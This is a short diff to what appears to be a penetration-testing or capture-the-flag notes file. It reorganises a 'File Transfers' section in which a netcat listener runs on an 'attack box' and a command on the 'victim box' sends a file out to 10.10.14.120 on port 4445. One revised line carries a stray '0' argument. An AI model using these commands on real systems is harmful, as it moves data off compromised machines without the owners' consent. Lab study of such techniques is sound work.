@@ -2,12 +2,18 @@
 
 ## File Transfers
 
+### Attack Box
+
+NC listener on attack box.
+
+nc -lvp 4445 > file.txt
+
 ### Victim Box
+
+Initiate the transfer on the victim box. Use -v so that NC doesnt just sit there when the transfer is complete.
 
 cd /home/user1/
 
-nc 10.10.14.120 4445 < file.txt
+nc -v 0 10.10.14.120 4445 < file.txt
 
-### Attack Box
 
-nc -lvp 4445 > file.txt
